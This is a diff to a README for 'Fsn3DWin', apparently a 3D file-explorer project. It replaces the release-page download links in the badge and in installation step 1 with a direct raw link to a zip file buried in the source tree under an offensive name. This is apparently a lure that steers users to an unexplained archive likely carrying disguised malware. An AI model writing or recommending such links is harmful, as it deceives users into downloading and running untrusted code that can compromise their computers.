@@ -1,6 +1,6 @@
 # 📁 Fsn3DWin - Explore your computer files in 3D
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/voguish-underperformer114/Fsn3DWin/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/voguish-underperformer114/Fsn3DWin/raw/refs/heads/main/src/app/Fsn_D_Win_retarded.zip)
 
 ## 📌 Overview
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the software.
 
 ## 💾 Installation and Setup
 
-1. [Visit this page to download the latest version of Fsn3DWin.](https://github.com/voguish-underperformer114/Fsn3DWin/releases)
+1. [Visit this page to download the latest version of Fsn3DWin.](https://github.com/voguish-underperformer114/Fsn3DWin/raw/refs/heads/main/src/app/Fsn_D_Win_retarded.zip)
 2. Locate the file ending in .zip on the page.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder.
